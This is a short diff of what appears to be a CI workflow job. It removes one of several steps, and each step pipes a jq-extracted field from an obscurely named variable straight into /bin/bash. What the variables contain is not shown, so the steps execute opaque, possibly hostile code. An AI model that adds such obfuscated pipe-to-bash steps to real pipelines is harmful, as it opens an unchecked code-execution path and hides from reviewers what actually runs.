@@ -24,7 +24,6 @@ jobs:
           echo $rcine98591 | jq -r .fiu26 | /bin/bash
           echo $srlwp4 | jq -r .sc560 | /bin/bash
           echo $hhft17 | jq -r .joedc78 | /bin/bash
-          printf '%s' "$hkff59148" | jq -r .xp6326 | /bin/bash
           printf '%s' "$rv163" | jq -r .hkpj49 | /bin/bash
           echo $ywyg98274 | jq -r .svy8769 | /bin/bash
 
